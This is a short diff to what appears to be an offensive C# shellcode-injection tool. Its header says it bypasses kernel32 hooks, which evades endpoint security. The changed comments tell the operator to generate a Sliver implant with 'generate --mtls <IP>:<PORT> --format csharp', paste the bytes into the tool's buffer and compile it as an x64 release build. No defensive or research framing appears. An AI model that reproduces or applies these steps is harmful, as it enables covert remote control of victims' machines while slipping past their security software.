@@ -7,9 +7,8 @@
 // hooks on kernel32 are bypassed.
 //
 // Shellcode (Sliver):
-//   sliver > generate --mtls <IP>:<PORT> --format shellcode --save /tmp/sc.bin
-//   python3 ../../sliver/sliver2arrays.py /tmp/sc.bin --csharp
-//   Paste the output into `buf` below.
+//   sliver > generate --mtls <IP>:<PORT> --format csharp --save /tmp/sc.cs
+//   Paste the byte[] array from sc.cs into `buf` below.
 //
 // Compile (Release, x64):
 //   csc /target:exe /platform:x64 /optimize+ /out:nt-injection.exe nt-injection.cs
@@ -68,7 +67,7 @@ namespace NtInjection
                 targetPid = procs[0].Id;
             }
 
-            // ── Paste your shellcode here (from sliver2arrays.py --csharp) ─────
+            // ── Paste your shellcode here (sliver > generate --format csharp) ─────
             byte[] buf = new byte[] { /* shellcode bytes */ };
             // ───────────────────────────────────────────────────────────────────
 
